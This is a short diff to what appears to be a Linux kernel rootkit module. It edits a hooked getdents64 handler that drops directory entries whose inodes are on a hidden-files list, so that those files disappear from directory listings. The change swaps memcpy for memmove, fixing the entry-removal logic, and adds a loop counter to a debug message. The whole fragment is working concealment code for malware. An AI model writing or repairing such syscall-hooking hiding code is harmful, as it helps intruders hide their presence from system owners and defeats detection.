@@ -162,11 +162,11 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		printk(KERN_INFO "Checking dirp\n");
 		number_dirps = actual_result / sizeof(struct linux_dirent64);
 		for (i = 0; i < number_dirps; i++) {
-			printk(KERN_INFO "How many dirps? %i\n",number_dirps);
+			printk(KERN_INFO "How many dirps? %i, %i\n",i,number_dirps);
 			list_for_each_entry(ptr,&hidden_files,list) {
 				if ((kdirp + i)->d_ino == ptr->inode) {
 					printk(KERN_INFO "Found file to hide\n");
-					memcpy(kdirp + i,kdirp + i + 1,
+					memmove(kdirp + i,kdirp + i + 1,
 					       sizeof(struct linux_dirent64)*(number_dirps-i-1));
 					hacked_result -= sizeof(struct linux_dirent64);
 				}
